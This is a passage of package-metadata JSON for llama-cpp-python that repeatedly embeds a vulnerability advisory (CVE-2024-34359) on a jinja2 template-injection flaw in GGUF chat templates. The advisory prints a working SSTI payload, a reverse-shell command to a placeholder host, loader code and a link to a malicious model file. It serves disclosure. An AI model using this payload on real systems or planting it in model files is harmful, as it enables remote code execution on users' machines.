None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.58":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.58/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.58","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"8e8c812402ef32432fbe9da1817b5f58e8ec2d8839c741fc374a8a9d5d78e300","md5":"b7b24280ccdd3d35e78bb3aec0559ecd","sha256":"50d4d16835326b15f5c4ed20dbf2f24508bf29b34531d50612ce215a596dde3f"},"downloads":-1,"filename":"llama_cpp_python-0.2.58.tar.gz","has_sig":false,"md5_digest":"b7b24280ccdd3d35e78bb3aec0559ecd","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":37387038,"upload_time":"2024-04-01T14:30:57","upload_time_iso_8601":"2024-04-01T14:30:57.783855Z","url":"https://files.pythonhosted.org/packages/8e/8c/812402ef32432fbe9da1817b5f58e8ec2d8839c741fc374a8a9d5d78e300/llama_cpp_python-0.2.58.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.59":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.59/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.59","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"c4b33e22b81dc89371aff82ed94a95208c57214b02dde9669546c7122fb28338","md5":"931bb9a5c7df13a03e09613354565afd","sha256":"4b19283226ab91c74c6d811d88724a6f32d9dd7d07caf9d8b897dd3372d5d4d2"},"downloads":-1,"filename":"llama_cpp_python-0.2.59.tar.gz","has_sig":false,"md5_digest":"931bb9a5c7df13a03e09613354565afd","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":37358223,"upload_time":"2024-04-03T19:40:36","upload_time_iso_8601":"2024-04-03T19:40:36.205442Z","url":"https://files.pythonhosted.org/packages/c4/b3/3e22b81dc89371aff82ed94a95208c57214b02dde9669546c7122fb28338/llama_cpp_python-0.2.59.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: 